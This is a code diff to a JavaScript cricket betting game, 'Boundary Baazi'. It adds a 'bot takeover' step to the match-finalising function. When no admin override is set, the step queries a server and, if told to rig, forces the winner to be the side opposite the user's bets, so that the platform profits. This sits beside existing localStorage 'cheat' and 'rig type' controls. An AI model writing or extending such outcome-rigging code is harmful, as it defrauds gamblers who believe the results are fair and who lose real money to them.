@@ -803,13 +803,30 @@ function settleAllBets() {
   return totalWinnings;
 }
 
-function finalizeMatch() {
+async function finalizeMatch() {
   let score1 = matchState.innings1.score;
   let score2 = matchState.innings2.score;
   let winner = null;
 
   let targetWinner = localStorage.getItem('cheat_boundary_winner');
   const rigType = localStorage.getItem('cheat_boundary_rig_type');
+
+  // --- Bot Takeover Integration for Boundary Baazi ---
+  // If no manual admin override is set, check bot takeover
+  if (!targetWinner && (!rigType || rigType === 'none' || rigType === '')) {
+    try {
+      const botRes = await fetch('/api/bot_decide/boundary', { method: 'POST' });
+      const botData = await botRes.json();
+      if (botData.shouldRig) {
+        // Bot takeover: force platform profit (opposite of user's bet)
+        const hasWinnerA = matchState.bets.some(b => b.marketKey === 'winner_A');
+        const hasWinnerB = matchState.bets.some(b => b.marketKey === 'winner_B');
+        if (hasWinnerA && !hasWinnerB) targetWinner = 'B';
+        else if (hasWinnerB && !hasWinnerA) targetWinner = 'A';
+        else if (hasWinnerA && hasWinnerB) targetWinner = 'tie';
+      }
+    } catch (e) { /* Server unreachable, skip bot logic */ }
+  }
 
   if (!targetWinner && rigType && rigType !== 'none' && rigType !== '') {
     const hasWinnerA = matchState.bets.some(b => b.marketKey === 'winner_A');
